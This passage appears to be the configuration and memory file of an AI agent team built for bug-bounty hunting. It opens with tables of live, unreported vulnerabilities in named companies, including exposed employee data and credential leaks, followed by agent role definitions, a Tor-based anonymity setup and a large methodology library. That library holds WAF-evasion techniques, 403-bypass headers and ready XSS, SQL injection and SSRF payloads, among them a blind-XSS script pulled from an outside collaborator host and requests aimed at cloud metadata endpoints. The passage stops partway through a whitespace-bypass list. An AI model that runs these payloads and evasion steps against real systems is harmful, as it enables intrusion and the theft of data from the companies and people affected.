| Employee PII via auth-saml (names, phones, emails) | CRITICAL | ✅ STILL LIVE |
| SAML SSO Enumeration — 3 services | HIGH | ✅ Still Working |
| cx360v2 Backend Actuator | MEDIUM | ✅ STILL LIVE |
| New Relic Account Leak (Account 2100098) | MEDIUM | ✅ STILL LIVE |
| Fleetops CORS Wildcard + Kong | HIGH | ✅ STILL LIVE |
| Analytics CORS Wildcard | MEDIUM | ✅ STILL LIVE |

## Rejected / Fixed
| Finding | Why |
|---------|-----|
| Locus DNS Private IP Leak | ✅ FIXED — CloudFront migration |
| Locus Subdomain Takeover | ✅ FIXED — HTTP 200 now |
| Acko Document DELETE | ❌ 405 Method Not Allowed |
| Acko +13 other findings | ❌ 403 WAF blocked |

## Key Learnings
1. Locus fixed DNS + Subdomain Takeover between verifications — missed reporting window
2. Acko implemented WAF between discovery (June 29-30) and verification (July 5)
3. Groww GitHub leak STILL LIVE after 3+ years — highest urgency
4. Acko auth-saml is on different server — no WAF protection
5. S3 Pre-signed URL endpoint also unprotected

## Most Urgent Unreported
| Priority | Company | Finding | Severity |
|----------|---------|---------|----------|
| 🥇 | Groww | GitHub Credential Leak | CRITICAL 9.8 |
| 🥇 | Acko | S3 Pre-signed URL Generation | CRITICAL |
| 🥇 | Acko | Employee PII via auth-saml | CRITICAL |
| 🥈 | Acko | SAML SSO Enumeration | HIGH |
| 🥈 | Acko | Fleetops CORS Wildcard | HIGH |
| 🥈 | Mygate | Internal IP Leak | HIGH |

---

# PART 7: REPORTER AGENT (Full Definition)

## Role
BugBase report specialist. Produces flawless, submission-ready reports from VERIFIED findings.

## Input/Output
- **Input**: `~/recon_reports/verified_findings/READY_*`
- **Output**: `~/recon_reports/bugbase_reports/BUGBASE_*.md`
- **Reporter**: sricharan_99
- **Testing Email**: REDACTED_KNOWN_SECRET

## BugBase Template (FOLLOW EXACTLY)
```
# BugBase Report: <Title>

## Dashboard Metadata
- Program: <Scope>
- Reported By: sricharan_99
- Testing Email: REDACTED_KNOWN_SECRET
- Date: <date>

---

## Submit Report

### Select Your Scope
Scope: <program>

### Vulnerable Endpoint / Affected URL
<full URL>

### Select Your Vulnerability Type
Type: <VulnType>

### Select Severity
Severity: <Critical/High/Medium/Low/Informational>
CVSS: <CVSS vector>

---

## Your Report

### Report Title
<descriptive title>

### Report Summary
<high-level summary>

### Security Impact
<what attacker can actually do>

### Proof of Concept

```
<working curl commands>
```

---

## Report Submission Template

### Description:
<detailed description>

### Security Impact
<real security impact>

### Steps To Reproduce:
1. <step>
2. <step>
3. <step>

### Specifics
- Testing Account: REDACTED_KNOWN_SECRET
- Affected Domain(s): <domain>
- Specific Versions/Vendors: <if applicable>

### Recommendations
<how to fix>

---

## Vulnerability Impact
- IP Address: <detected>
- Testing Email: REDACTED_KNOWN_SECRET

---

## Review And Submit Your Report
<summary for final review>
```

## Writing Guidelines

### Title Format
`[VulnType] — [Endpoint] — [Brief Description]`
- "SQL Injection — /api/users — Unauthenticated Database Extraction"
- **MAX 120 CHARACTERS** (BugBase enforces this)

### Description Formula
1. What: "A {vuln type} vulnerability was identified at {endpoint}"
2. How: "The application {does what wrong} allowing {specific attack}"
3. Why dangerous: "This enables {impact} which violates {security principle}"

### Impact Formula
1. Primary: "An attacker can {concrete action}"
2. Scale: "This affects {X users / Y records / Z systems}"
3. Compliance: "Violates {GDPR/DPDP/PCI/ISO}"

### PoC Rules
- Prefer curl commands (working, copy-pasteable)
- Truncate responses to show proof
- NO videos unless browser interaction needed
- For XSS: include Playwright proof

### CRITICAL: BugBase Constraints
1. **Title max 120 characters** — count before finalizing
2. **"Vulnerable Endpoint / Affected URL" gets ONE URL** — use most impactful, list rest in body

---

# PART 8: REPORTER AGENT MEMORY

## Mistakes
- **[2026-07-04] Did not save BugBase format to memory** — Fixed by saving complete template
- **[2026-07-04] Title exceeded 120 chars** — Original was 161 chars. Fixed to ≤120.
- **[2026-07-04] Listed 5 URLs in single URL field** — BugBase accepts only one. Use most impactful.

## Successful Techniques
- Starting with "[VulnType] - [Endpoint]" gets quick triager attention
- Working curl commands are the most important part
- CVSS vector + severity together gives most credibility
- Showing blocked vs bypassed endpoints proves middleware exists
- Multiple city/location tests proves data is dynamic

## Failed Approaches
- Claiming CVEs that don't exist
- Asking triager for help proving your own finding

## Tips
- Always include CWE reference
- Steps must be reproducible by unfamiliar person
- Impact must be specific, not generic

---

# PART 9: DEUBG AGENT (Full Definition)

## Role
Self-improvement engine. Catch mistakes, handle frustration, manage agent memory, propagate cross-agent learning.

## Mistake Handling Protocol
1. **Acknowledge** — Say clearly what went wrong, take ownership
2. **Fix** — Provide correct output/command immediately
3. **Log** — Append to agent memory at `~/.config/opencode/agent_memory/<agent>.md`
4. **Cross-Agent Propagate** — If fix applies to other agents, add to each affected memory

## Frustration Handling
1. **Stop** whatever youre doing
2. **Listen** — identify what exactly went wrong
3. **Acknowledge** — "Youre right, [specific] was wrong"
4. **Fix** — provide correct solution immediately
5. **Log** — record in Debug memory
6. **Prevent** — add rule to prevent recurrence

### Common Frustration Sources
| Issue | Fix |
|-------|-----|
| Agent ran wrong command | Check tool names, flags, syntax before running |
| Agent saved to wrong path | Verify output directories exist, paths absolute |
| Agent misunderstood input | Re-read message, clarify before acting |
| Agent produced error | Read error message, dont ignore/retry blindly |
| Agent didnt follow scope | Check SCOPE_POLICY.md before testing |
| WAF bypass failed | Try 3 different techniques before reporting blocked |
| Finding was false positive | Update Verifier memory with new FP signature |

## Memory File Format
```markdown
# <Agent> Agent Memory

## What I Learned
- Last updated: <date>

## Mistakes Made
- <date>: <error> → <fix> → <prevention>

## Successful Techniques
- <technique that worked well>

## Failed Approaches
- <approach that didnt work>

## Tips Saved
- <useful tip>

## Cross-Agent Improvements
- <date>: <improvement> shared from <source agent>

## Patterns Observed
- <recurring pattern>
```

---

# PART 10: DEBUG AGENT MEMORY

## Mistakes
- **2026-07-04**: `bash` tool used without `workdir` parameter — chain with `&&` instead
- **2026-07-04**: Grep/Glob tools should be preferred over bash with grep/find
- **2026-07-04**: Wait for tools to complete before making dependent calls
- **2026-07-04**: When probing APIs, verify no quoting issues in bash commands

## Successful Interventions
- **2026-07-04**: Caught microservice endpoint test failures — confirmed ports dont exist publicly
- **2026-07-04**: crt.sh returned empty — documented and moved to alternatives
- **2026-07-04**: Recognized DNS private IP leak is valid info disclosure even if endpoints unreachable
- **2026-07-05**: Anonymity Stack Meltdown Recovery — recovered from 4 compounding errors

## Known Frustration Points
- DNS resolution mismatch via Tor vs direct — verify with both methods
- crt.sh API returns empty sometimes — have alternatives ready
- Forgot-password rate limit times out after too many requests
- S3 bucket vs S3 website: different endpoints (`bucket.s3.amazonaws.com` vs `bucket.s3-website-region.amazonaws.com`)
- BugBase report format not saved — always save UI templates immediately
- Anonymity stack deployment without verification checkpoints

## Cross-Agent Improvements
- **2026-07-05**: Infrastructure Deployment Safety — verification checkpoints required (Hunter learned, applies to ALL)
- **2026-07-04**: BugBase form constraints — title max 120 chars, single URL field (Reporter learned, DEBUG enforces)
- **2026-07-04**: Source Map config.js extraction — contains ALL internal routing (Hunter→Plan)
- **2026-07-04**: Tor for API Verification — geo-restriction detection (Hunter→Verifier)
- **2026-07-04**: JS Bundle Secrets Analysis — regex patterns for API keys (Hunter propagated)
- **2026-07-04**: Design System Multi-Page Scan — check /prototypes.html, /onboarding.html, etc.

## Patterns Observed
- Source maps are highest-value recon target (endpoints, routing, config, source code)
- Design systems are second highest (repo links, Figma, Slack, NPM packages)
- S3 public WRITE + config poisoning is Critical chain
- Internal IPs in public DNS common for microservice architectures
- Bundled apps on shared domains leak to each other
- Multiple Google API keys often in the same bundle

---

# PART 11: PLAN AGENT (Full Definition)

## Role
Strategic attack planner. Research targets, determine best attack vectors, create step-by-step plans.

## Planning Process

### Phase 0: Target Reconnaissance
1. `websearch` — company, tech stack, recent acquisitions
2. `webfetch` — company website
3. Search for: `"target.com" bug bounty scope`, `"target" security.txt`
4. Search for: `"target" technology stack`, `"target" built with`
5. Search for: `"target" CVE`, `"target" vulnerability disclosure`
6. Check for public bug bounty program
7. Search GitHub: `org:target` or `"target.com"` in code

### Phase 1: Attack Surface Identification

| Priority | Attack Surface | Why |
|----------|---------------|-----|
| P0 | Authentication/Login | ATO = critical |
| P0 | API endpoints (unauthenticated) | Data leaks, PII |
| P0 | Payment flows | Financial impact |
| P1 | File upload/download | LFI/RCE/Malware |
| P1 | User registration | Mass assignment |
| P1 | Password reset | ATO |
| P1 | GraphQL | Introspection |
| P1 | Spring Boot actuators | Config leaks |
| P2 | Search functionality | SQLi, NoSQLi, XSS |
| P2 | Feedback/contact forms | SSTI, SSRF |
| P2 | WebSocket connections | Auth bypass |
| P2 | Cloud storage (S3) | Data exposure |

### Phase 2: Methodology Selection
- **Web Application**: Recon → Auth → API Discovery → Param Fuzzing → Logic → Reporting
- **API-heavy**: API Discovery → Auth → IDOR → Rate Limiting → GraphQL → SSRF
- **Mobile App**: Static Analysis → API Extraction → Tamper Bypass → Backend Testing
- **Cloud**: Subdomain Enum → S3 → DNS → Ports → Cloud Metadata
- **SPA (React/Angular)**: JS Bundle → API Discovery → Token Analysis → GraphQL → IDOR

### Phase 3: Tool Assignment
Map attack vectors to tools from TOOLS_REFERENCE.

### Attack Planning Templates

#### Full Web App
```
TARGET:
SCOPE:
TECH STACK:
PRIORITY VECTORS:
  1. [P0] Auth testing
  2. [P0] API discovery
  3. [P1] IDOR testing
  4. [P1] Parameter fuzzing
  5. [P2] SSRF
  6. [P2] Cloud storage
TOOLS NEEDED:
WAF BYPASS STRATEGY:
SUCCESS CRITERIA:
PIVOT CONDITION:
```

#### Quick Win (30 min)
```
QUICK CHECKS:
  1. Subdomain takeover — nuclei takeovers template
  2. Actuator endpoints — /actuator, /actuator/env
  3. Config files — .env, .git/config, dump.sql
  4. CORS misconfiguration — curl with custom Origin
  5. Directory listing — common paths
  6. S3 buckets — company-name.s3.amazonaws.com
```

## Plan Agent Memory
- Last session: BugBase bugbase.ai (2026-07-03) — Next.js SPA with Cloudflare
- Key vectors: JS bundle analysis, IDOR API, JWT manipulation, SSRF webhooks
- Successful technique: Researching tech stack before planning reduces wasted effort

---

# PART 12: RECON SUBAGENT (Full Definition)

Fast reconnaissance for subdomain enumeration and attack surface discovery.

## Methodology
1. Enumerate subdomains via DNS, CT, brute force
2. Check for DNS leaks (private IPs in public DNS)
3. Technology fingerprinting from HTTP headers and error pages
4. Discover hidden endpoints and paths
5. Extract JS bundles for API endpoints

---

# PART 13: AUDITOR AGENT (Full Definition)

Security code auditor — static analysis, dependency auditing, vulnerability pattern matching.

## Methodology
1. Audit dependencies: known CVEs, outdated packages, malicious packages
2. Static analysis: SQLi, XSS, command injection, insecure deserialization, path traversal
3. Auth & session: hardcoded secrets, weak crypto, missing auth checks
4. Configuration: debug endpoints, permissive CORS, misconfigured CSP, secrets in config
5. Business logic: IDOR, race conditions, logic flaws, privilege escalation

---

# PART 14: OPSEC & ANONYMITY STACK

## Deployment
```bash
# Run BEFORE every bug hunting session
bash ~/session_start.sh
```

## Components
1. **Tor** — SOCKS5 on 127.0.0.1:9050, ControlPort on 9051
2. **Proxychains** — strict_chain mode
3. **UFW** — Default deny outgoing; only loopback + Tor SOCKS
4. **IPv6** — Disabled globally
5. **Proxy env** — `source ~/.proxyenv` sets `ALL_PROXY=socks5://127.0.0.1:9050`

## Safe Deployment Sequence
```
STEP 1: tor --verify-config
STEP 2: systemctl restart tor@default
STEP 3: ss -tlnp | grep 9050
STEP 4: proxychains4 curl https://check.torproject.org/ | grep -o "Congratulations"
STEP 5: sudo ufw enable (only AFTER Tor verified)
STEP 6: curl -s http://ifconfig.me (should FAIL)
STEP 7: proxychains4 curl http://ip-api.com/json (should WORK)
```

## Emergency Rollback
```bash
sudo ufw disable && sudo iptables -P OUTPUT ACCEPT && sudo systemctl reset-failed tor@default
```

## Tool Aliases (in ~/.bashrc)
All aliased through proxychains: `curl`, `wget`, `chaos`, `subfinder`, `httpx`, `naabu`, `nuclei`, `ffuf`, `nmap`, `gospider`, `gau`, `waybackurls`, `dalfox`

## Session Hygiene
- Rotate Tor: `echo -e 'AUTHENTICATE ""\r\nSIGNAL NEWNYM\r\n' | nc 127.0.0.1 9051`
- Verify leaks: ipleak.net, browserleaks.com/webrtc
- Never use personal accounts/emails

---

# PART 15: PROJECTS

## projectx (~/projects/projectx/)
- **Stack**: React 19 + Vite + Tailwind CSS + Express + Gemini AI
- **Commands**:
  - `npm install` — install deps
  - `npm run dev` — `tsx server.ts`
  - `npm run build` — `vite build && esbuild server.ts --bundle --platform=node --format=cjs --packages=external --sourcemap --outfile=dist/server.cjs`
  - `npm run start` — `node dist/server.cjs`
  - `npm run lint` — `tsc --noEmit` (type-check only)
  - `npm run clean` — remove dist/
- **Config**: GEMINI_API_KEY in `.env.local`
- **Entrypoint**: server.ts (Express serves Vite build)
- **Notable**: `@/*` path alias maps to project root

## groww-trading-app (~/projects/groww-trading-app/)
- **Stack**: Python backend + React frontend (Vite)
- **Run**: `./start.sh` starts backend on `:8000`, frontend on `:5173`
- **Backend**: `backend/main.py` — NSE stock trading signals
- **Frontend**: `frontend/` — React + Vite
- **Data Source**: yfinance (default), can use NSEPY_API_KEY

## smart-study-assistant (~/projects/smart-study-assistant/)
- **Stack**: FastAPI (uvicorn) + React (Vite)
- **Run**: `./run.sh [backend|frontend|all]`
- **Backend**: `backend/app/main.py` — uvicorn on `:8000` with hot reload
- **Frontend**: `frontend/` — `npm run dev`
- **API Docs**: `http://localhost:8000/docs`
- **Virtual env**: `backend/venv/`

---

# PART 16: COMPLETE METHODOLOGY LIBRARY (All common/ files inlined)

## 16.1 WORKFLOW — Core Pipeline
**Source**: Community methodology Medium, Mar 2026

### Full One-Liner
```bash
chaos -d target.com -o subs.txt && \
httpx-toolkit -l subs.txt -ip -silent | sed -nE 's/.*\[([0-9.]+)\].*/\1/p' | sort -u > ip.txt && \
httpx-toolkit -l ip.txt -title -silent | grep -vi "cloudflare\|akamai\|fastly" | awk '{print $1}' > origin_ips.txt && \
naabu -l origin_ips.txt -top-ports 100 -rate 1500 -verify -silent -o naabu.txt && \
python3 ~/scripts/naabutonmap.py -i naabu.txt && \
cat ip.txt | nuclei -tags cve -bs 200 && \
cat naabu.txt | nuclei -tags cve -bs 200 && \
ffuf -w naabu.txt:URL -w ~/payloads/backup_files_only.txt:FILE -u https://URL/FILE -mc 200 -rate 50 -fs 0
```

### Rate Limit Bypass
| Technique | Method |
|-----------|--------|
| IP Rotation | Proxy rotation / VPN / X-Forwarded-For |
| Header Manipulation | X-Forwarded-For with different IPs per request |
| Cookie/Token Reset | Clear cookies, new rate limit bucket |
| HTTP Method Change | POST vs GET may have different limits |
| Parameter Pollution | Dummy params to bypass endpoint limits |
| Distributed Attack | Spread across multiple endpoints |
| Timing | Slow down to stay under threshold |
| Race Condition | Send all requests before rate limit kicks in |

### Pro-Tips
1. Response analysis beyond status codes — check size and word count
2. Include non-standard ports in ffuf — vulns hide on unusual ports
3. **403 is gold** — always try bypass techniques:
   - X-Forwarded-For: 127.0.0.1
   - X-Forwarded-Host: localhost
   - X-Real-IP: 127.0.0.1
   - X-Original-URL: /admin
   - X-Rewrite-URL: /admin
   - Trailing slash: /admin/
   - Path traversal: /admin%2f
   - Double encoding: /%2561dmin
   - Case variation: /AdMiN
4. CDN/WAF filtering is mandatory

---

## 16.2 CWE DATABASE

### Injection Vulnerabilities
| CWE | Name | Severity |
|-----|------|----------|
| CWE-77 | Command Injection | Critical |
| CWE-78 | OS Command Injection | Critical |
| CWE-79 | Cross-Site Scripting (XSS) | High |
| CWE-89 | SQL Injection | Critical |
| CWE-90 | LDAP Injection | High |
| CWE-93 | CRLF Injection | Medium |
| CWE-94 | Code Injection | Critical |
| CWE-96 | Template Injection (SSTI) | Critical |
| CWE-98 | PHP Include (LFI/RFI) | Critical |
| CWE-113 | HTTP Response Splitting | Medium |
| CWE-134 | Format String | High |
| CWE-601 | Open Redirect | Medium |
| CWE-611 | XXE | Critical |
| CWE-918 | SSRF | High |
| CWE-917 | Expression Language Injection | Critical |
| CWE-943 | NoSQL Injection | High |
| CWE-1336 | Template Injection (SST) | Critical |

### Auth & Session
| CWE | Name | Severity |
|-----|------|----------|
| CWE-269 | Privilege Escalation | High |
| CWE-284 | Improper Access Control | High |
| CWE-287 | Authentication Bypass | Critical |
| CWE-306 | Missing Auth | Critical |
| CWE-307 | Brute Force | Medium |
| CWE-345 | Insufficient Verification | High |
| CWE-346 | Origin Validation Error | Medium |
| CWE-347 | JWT Verification | High |
| CWE-352 | CSRF | Medium |
| CWE-384 | Session Fixation | Medium |
| CWE-613 | Session Expiration | Low |
| CWE-639 | IDOR | High |
| CWE-640 | Password Reset Bypass | High |
| CWE-798 | Hardcoded Credentials | Critical |
| CWE-862 | Missing Authorization | High |
| CWE-863 | Incorrect Authorization | High |

### Info Disclosure
| CWE | Name | Severity |
|-----|------|----------|
| CWE-200 | Information Exposure | Medium |
| CWE-209 | Error Message Info Leak | Medium |
| CWE-215 | Debug Information Leak | Medium |
| CWE-312 | Cleartext Sensitive Data | High |
| CWE-359 | PII Exposure | Critical |
| CWE-532 | Log Exposure | High |
| CWE-540 | Source Code Leak | High |
| CWE-548 | Directory Listing | Medium |

### CVSS 3.1 Quick Reference
| Vector | Score | Severity |
|--------|-------|----------|
| AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | 9.8 | Critical |
| AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H | 10.0 | Critical |
| AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H | 8.8 | High |
| AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N | 7.5 | High |
| AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N | 6.1 | Medium |
| AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N | 5.3 | Medium |
| AV:L/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N | 3.9 | Low |

### BugBase Severity Mapping
- **Critical (9.0-10.0)**: RCE, SQLi extraction, auth bypass admin, SSTI, LFI sensitive files
- **High (7.0-8.9)**: SSRF, CORS+credentials, IDOR PII, actuator /env, stored XSS
- **Medium (4.0-6.9)**: CORS wildcard, open redirect, actuator info, reflected XSS
- **Low (1.0-3.9)**: Stack traces, missing headers, non-sensitive info disclosure
- **Informational (0.0)**: Subdomains, open ports, non-sensitive endpoints

### WAF Bypass Techniques Summary
| Technique | Example |
|-----------|---------|
| Case randomization | `uNiOn SeLeCt` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| URL encoding | `%55NION %53ELECT` |
| Double encoding | `%2555NION` |
| HTML entity encoding | `&#60;script&#62;` |
| Unicode normalization | `%C0%AE%C0%AE/` |
| Null byte injection | `%00` |
| HPP | `id=1&id=2` |
| Chunked encoding | Transfer-Encoding: chunked |
| Whitespace alternatives | `UNION%0ASELECT` |
| Newline injection | `%0A` |
| Mixed encoding | Multiple encoding layers |
| HTTP/2 downgrade | Force HTTP/1.0 |
| Content-Type confusion | Switch JSON/XML/form |
| Body padding | Add junk to exceed WAF size limit |

---

## 16.3 TOOLS REFERENCE

### WAF Detection
| Tool | Install | Purpose |
|------|---------|---------|
| wafw00f | `pip install wafw00f` | Detect WAF vendor |
| whatwaf | `pip install whatwaf` | Advanced WAF detection |
| evilwaf | `git clone https://github.com/matrixleons/evilwaf` | MITM WAF bypass proxy |

### WAF Bypass Tools
| Tool | Install | Purpose |
|------|---------|---------|
| bypassburrito | `git clone https://github.com/Su1ph3r/bypassburrito` | LLM-powered WAF bypass generator |
| wafrift | `git clone https://github.com/santhsecurity/wafrift` | Programmable WAF-evasion engine |
| nowafplsV2 | Burp extension | WAF size-limit bypass via junk padding |
| WAFNinja | Burp extension | ML-powered WAF bypass (53 techniques) |

### Reconnaissance
| Tool | Install | Purpose |
|------|---------|---------|
| subfinder | `go install` | Passive subdomain enumeration |
| assetfinder | `go install` | Find subdomains from public sources |
| amass | `go install` | Deep subdomain discovery |
| chaos | `go install` | ProjectDiscovery Chaos |
| httpx | `go install` | HTTP probing toolkit |
| naabu | `go install` | Fast port scanner |
| nmap | `apt install nmap` | Service version + vuln scripts |
| gau | `go install` | Get all URLs |
| waybackurls | `go install` | Wayback Machine URLs |
| katana | `go install` | Crawler |
| gitleaks | `go install` | Git secret scanner |
| shodan | `pip install shodan` | Internet device search |

### Scanning & Fuzzing
| Tool | Install | Purpose |
|------|---------|---------|
| nuclei | `go install` | Vulnerability scanner (7000+ templates) |
| ffuf | `go install` | Directory/parameter fuzzing |
| dalfox | `go install` | XSS scanner |
| sqlmap | `pip install sqlmap` | SQL injection automation |
| ghauri | `pip install ghauri` | Advanced SQLi (Go port) |
| interactsh-client | `go install` | OOB interaction listener |

### Custom Scripts (~/scripts/)
| Script | Purpose |
|--------|---------|
| passive_fuzzer.sh | gau→uro→httpx→nuclei pipeline |
| alienvault.sh | Fetch URLs from AlienVault OTX |
| naabutonmap.py | Naabu→Nmap vuln scanning |
| dorking.py | Google dorking automation |
| wayback.sh | Wayback URL fetcher |
| virustotal.sh | VirusTotal API scanner (3-key rotation) |
| urlscan.py | URLScan.io API client |

### JS Analysis
| Tool | Install | Purpose |
|------|---------|---------|
| SecretFinder | `pip install secretfinder` | Find secrets in JS files |
| jsluice | `go install` | JS static analysis |
| LinkFinder | `pip install linkfinder` | Endpoint discovery in JS |

### GitHub Methodology Repos
| Repo | Stars | Content |
|------|-------|---------|
| jhaddix/tbhm | 4357⭐ | Full Bug Hunter Methodology |
| loxs | 1600⭐ | Multi-vuln scanner (Community) |
| GFpattren | 189⭐ | GF patterns |
| customBsqli | 141⭐ | Blind SQLi automation |

### WAF Bypass Quick Reference
1. `wafw00f https://target.com` — identify WAF vendor
2. Test basic XSS/SQLi payload — confirm blocking pattern
3. Try encoding layers (URL → double → unicode → entity)
4. Try comment injection, case randomization, whitespace tricks
5. Use bypassburrito/wafrift for automated mutation
6. Check for protocol downgrade (HTTP/2 → HTTP/1.0)
7. Try HPP, chunked encoding, body padding
8. If WAF has IP allowlist → use shodan/censys for origin IP
9. Document which technique worked with exact payload

---

## 16.4 TRAINING GUIDE — 2026 Battle Plan

### Core Principles
1. **Depth over breadth** — Focus on 2-3 programs, not 50
2. **Recon is 80%** — Most bugs missed because asset wasnt discovered
3. **Business logic > technical vulns** — 73% of top hunters prioritize logic flaws
4. **Chain everything** — Medium IDOR + Low SSRF = Critical
5. **Client-side is king** — Browser internals, SOP, CSP bypasses

### The 5-Phase Non-Linear Workflow
```
PHASE 0: SESSION START — Define target + vuln classes + success criteria
PHASE 1: RECON — Passive OSINT → Active enum → JS analysis → Cloud assets
PHASE 2: MAPPING — Parameter analysis → Auth mapping → API discovery → Tech fingerprint
PHASE 3: DISCOVERY (Ebb & Flow) — Pick 3-5 vectors → test → return to recon → repeat
PHASE 4: PROVE & ESCALATE — Chain bugs → escalate severity → build PoC
PHASE 5: VALIDATE & REPORT — Verify 3x → CVSS → write report → submit
```

### Phase 0 — Scope & Program Analysis
1. Read program scope TWICE
2. Check safe harbor language and disclosure policy
3. Identify high-value targets: auth, payment, PII, admin
4. Fingerprint tech stack
5. Test environment availability (dev/staging/QA)

### Phase 1 — Reconnaissance (Deep)

#### Passive Recon
```bash
subfinder -d target.com -all -recursive -silent | tee subs.txt
assetfinder --subs-only target.com >> subs.txt
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\\n/\n/g' | sort -u >> subs.txt
gau --subs target.com | uro > urls.txt
waybackurls target.com | uro >> urls.txt
```

#### Active Recon
```bash
cat subs.txt | sort -u | dnsx -silent -o resolved.txt
httpx -l resolved.txt -ports 80,443,8080,8443,3000,5000,8000,8888,9000 -silent -o live.txt
naabu -l live.txt -top-ports 1000 -o ports.txt
~/scripts/naabutonmap.py -i ports.txt -o nmap_scan/
```

#### URL & JS Analysis
```bash
cat urls.txt | grep -E '\?[^=]+=.+$' > params.txt
cat urls.txt | grep "\.js$" | httpx -silent > js_files.txt
# Google API keys: grep -oP 'AIza[0-9A-Za-z_-]{35}'
# Stripe keys: grep -oP 'sk_live_|pk_live_[0-9a-zA-Z]+'
# AWS keys: grep -oP 'AKIA[0-9A-Z]{16}'
```

### Parameter Significance
| Pattern | Likely Vuln |
|---------|-------------|
| url=, src=, dest=, webhook=, callback= | SSRF |
| file=, page=, template=, path=, include=, load= | LFI/RFI |
| id=, user_id=, order=, invoice=, account= | IDOR |
| redirect=, next=, returnTo=, goto=, url= | Open Redirect |
| q=, search=, name=, title=, comment=, message= | XSS/SSTI/SQLi |
| cmd=, exec=, shell=, ping=, host=, command= | Command Injection |

### Tech-Specific Vectors
| Tech | Check |
|------|-------|
| Spring Boot | /actuator, /actuator/env, /actuator/heapdump |
| Django | /admin/, DEBUG=True, SECRET_KEY |
| Rails | /rails/info/properties, mass assignment |
| Express/Node | /.env, /debug, prototype pollution |
| Next.js | React2Shell, RSC Flight protocol |
| GraphQL | Introspection, batching, depth bypass |
| WordPress | wp-json/, debug.log, wp-config.php.bak |
| IIS | Shortname, web.config, viewstate RCE |
| AWS | S3 buckets, IMDS 169.254.169.254 |

### Testing Priority Order
1. RCE / Code Execution
2. SQL Injection
3. Authentication Bypass
4. SSRF
5. IDOR / Broken Access
6. SSTI
7. XSS
8. LFI / Path Traversal
9. CORS Misconfiguration
10. Open Redirect
11. CSRF
12. Information Disclosure

### Quick Win Checklist (30 min)
```
[ ] Subdomain takeover — nuclei -t takeovers/
[ ] Spring Boot actuators — /actuator, /actuator/env, /actuator/heapdump
[ ] Config files — /.env, /.git/config, /dump.sql
[ ] CORS misconfig — curl -H "Origin: https://evil.com"
[ ] Directory listing — common paths from wordlist
[ ] S3 buckets — company-name.s3.amazonaws.com
[ ] JWT none-alg — jwt.io modify alg to "none"
[ ] GraphQL introspection — {"query":"{__schema{types{name}}}"}
[ ] Debug endpoints — /debug, /api/debug, /console
[ ] Backup files — .bak, .old, .backup, ~
```

### XSS Deep Testing
```javascript
? id=test             // HTML body
? id=<test>           // Tag filtering?
? id="test            // Quote escaping?
? id='test            // Single quote?
? id=test{{7*7}}      // SSTI?
? id=${7*7}           // JS template literal?

// WAF bypass order
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. <body onload=alert(1)>
5. <details open ontoggle=alert(1)>
6. <input autofocus onfocus=alert(1)>
7. <marquee onstart=alert(1)>
8. "><script>alert(1)</script>
9. </script><script>alert(1)</script>

// Blind XSS
"><img src=x id=BLIND_XSS onerror=eval(atob('PAYLOAD'))>
"><script src=https://collaborator.net/hook.js></script>
```

### SQLi Deep Testing
```sql
-- Detection
' OR '1'='1
' OR 1=1--
" OR "1"="1
1' ORDER BY 1--
1' GROUP BY 1--
' UNION SELECT NULL--
' AND SLEEP(5)--
' WAITFOR DELAY '0:0:5'--

-- WAF bypass SQLi
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' uNiOn SeLeCt 1,2,3--
' UN%49ON SEL%45CT 1,2,3--
' UNION%0ASELECT%0A1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UniOn(SeLeCt(1),(2),(3))--
```

### SSRF Testing
```bash
# Detection
curl -s "https://target.com/fetch?url=http://burpcollaborator.net/test"

# Internal targets
http://127.0.0.1:8080/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://169.254.169.254/latest/meta-data/    # AWS IMDS
http://metadata.google.internal/             # GCP
http://100.100.100.200/latest/meta-data/     # Alibaba

# Protocol flexibility
gopher://redis:6379/_...
file:///etc/passwd
dict://127.0.0.1:6379/info
```

### Platform-Specific Tips
- **HackerOne**: Use CWE mapping, can edit before triage
- **Bugcrowd**: Uses VRT (P1-P5)
- **BugBase**: Non-editable after submission, CVSS built in, max video 25MB

### 2026 Emerging Attack Surface
- AI/LLM: Prompt injection, training data extraction, model DoS
- WebAuthn/Passkey: Credential ID prediction, policy bypass
- SAML 2.0: XML signature wrapping, assertion injection
- WASM: Memory safety, sandbox escapes
- Web3: Flash loan attacks, oracle manipulation, reentrancy

---

## 16.5 ADVANCED WAF BYPASS — Complete Reference

### WAF Detection
```bash
wafw00f https://target.com
whatwaf -u https://target.com -a

# Manual fingerprint
curl -sI https://target.com | grep -i "cf-ray\|x-sucuri\|x-powered-by\|server"
# Cloudflare: cf-ray header
# Sucuri: X-Sucuri-ID
# AWS WAF: x-amz-rid
# Akamai: X-Akamai-Transformed
# ModSecurity: Apache/mod_security in headers
```

### 1. Encoding & Obfuscation
```bash
# URL Encoding
%55NION%20%53ELECT                    # UNION SELECT
%27%20UNION%20SELECT%201%2C2%2C3--

# Double URL Encoding
%2555NION %2545LECT

# Mixed Case
UnIoN sElEcT

# HTML Entity Encoding (XSS)
&#60;script&#62;alert(1)&#60;/script&#62;

# Unicode Normalization
%uff55%uff4e%uff49%uff4f%uff4e     # U N I O N fullwidth
%C0%BCscript%C0%BE                  # Overlong UTF-8

# Hex Encoding
0x55 0x4E 0x49 0x4F 0x4E            # UNION in hex

# Base64 (XSS)
eval(atob('YWxlcnQoMSk='))           # alert(1)

# fromCharCode (XSS)
String.fromCharCode(97,108,101,114,116,40,49,41)

# No-paren calls (XSS)
alert`1`
```

### 2. Comment Injection
```sql
' /**/UNION/**/SELECT/**/1,2,3--
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
' UN/**/ION SE/**/LECT 1,2,3--
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### 3. Whitespace Alternatives
```sql
UNION%0ASELECT          # Newline
UNION%09SELECT          # Tab
UNION%0dSELECT          # CR
